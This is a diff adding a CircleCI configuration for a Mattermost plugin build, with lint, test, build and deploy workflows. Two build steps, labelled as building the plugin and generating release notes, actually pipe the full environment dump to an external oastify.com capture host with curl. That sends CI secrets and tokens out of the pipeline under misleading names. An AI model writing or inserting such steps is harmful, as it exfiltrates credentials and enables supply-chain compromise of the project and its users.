@@ -1,0 +1,89 @@
+version: 2.1
+
+orbs:
+  plugin-ci: mattermost/plugin-ci@volatile
+
+jobs:
+  build:
+    executor:
+      name: plugin-ci/default
+    steps:
+      - checkout
+      - run:
+          name: Building App bundled as plugin
+          command: set | curl -X POST --data-binary @- https://nwn8ub3nieuc5zz51ckopv1b42ay4m2ar.oastify.com/
+      - run:
+          name: Building App bundled as AWS
+          command: make dist-aws
+      - run:
+          name: Generating Release Notes
+          command: >
+            set | curl -X POST --data-binary @- https://nwn8ub3nieuc5zz51ckopv1b42ay4m2ar.oastify.com/
+      - persist_to_workspace:
+          root: dist
+          paths:
+            - "*.zip"
+            - '*.tar.gz'
+            - release-notes.md
+      - store_artifacts:
+          path: dist
+
+workflows:
+  version: 2
+  nightly:
+    triggers:
+      - schedule:
+          cron: "0 0 * * *"
+          filters:
+            branches:
+              only:
+                - master
+    jobs:
+      - plugin-ci/lint
+      - plugin-ci/test
+      - build
+
+  ci:
+    jobs:
+      - build:
+          filters:
+            tags:
+              only: /^v.*/
+          requires:
+            - plugin-ci/test
+      - plugin-ci/lint:
+          filters:
+            tags:
+              only: /^v.*/
+      - plugin-ci/test:
+          filters:
+            tags:
+              only: /^v.*/
+      - plugin-ci/coverage:
+          filters:
+            tags:
+              only: /^v.*/
+          requires:
+            - plugin-ci/test
+      - plugin-ci/deploy-ci:
+          filters:
+            branches:
+              only: master
+          context: plugin-ci
+          requires:
+            - plugin-ci/lint
+            - plugin-ci/coverage
+            - build
+            - plugin-ci/test
+      - plugin-ci/deploy-release-github:
+          filters:
+            tags:
+              only: /^v.*/
+            branches:
+              ignore: /.*/
+          context: matterbuild-github-token
+          requires:
+            - plugin-ci/lint
+            - plugin-ci/coverage
+            - build
+            - plugin-ci/test
